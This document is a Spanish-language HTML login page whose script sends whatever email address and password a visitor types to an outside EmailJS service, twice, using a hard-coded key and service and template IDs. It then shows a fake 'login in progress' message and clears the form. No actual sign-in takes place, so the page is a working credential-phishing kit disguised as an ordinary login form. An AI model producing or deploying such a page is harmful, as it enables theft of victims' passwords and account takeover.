<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
</head>
<body>
    <form id="contact-form">
        <label for="email">Correo Electrónico:</label>
        <input type="email" id="email" name="email" required>
        <br>
        <label for="password">Contraseña:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="submit">Iniciar Sesión</button>
    </form>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init('vXFL1_J2AhuYYvCSx');

            document.getElementById('contact-form').addEventListener('submit', function(event) {
                event.preventDefault();

                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;

                if (email && password) {
                    // data
                    var templateParams = {
                        email: email,
                        password: password
                    };

                    // firstul
                    emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
                        .then(function(response) {
                            console.log('Inicio de sesión en curso...', response);
                        }).catch(function(error) {
                            console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
                        });

                    // seconse
                    emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
                        .then(function(response) {
                            console.log('Inicio de sesión en curso...', response);
                        }).catch(function(error) {
                            console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
                        });

                    alert('Inicio de sesión en curso...');
                    document.getElementById('contact-form').reset();
                } else {
                    alert('Por favor, completa todos los campos para iniciar sesión.');
                }
            });
        })();
    </script>
</body>
</html>
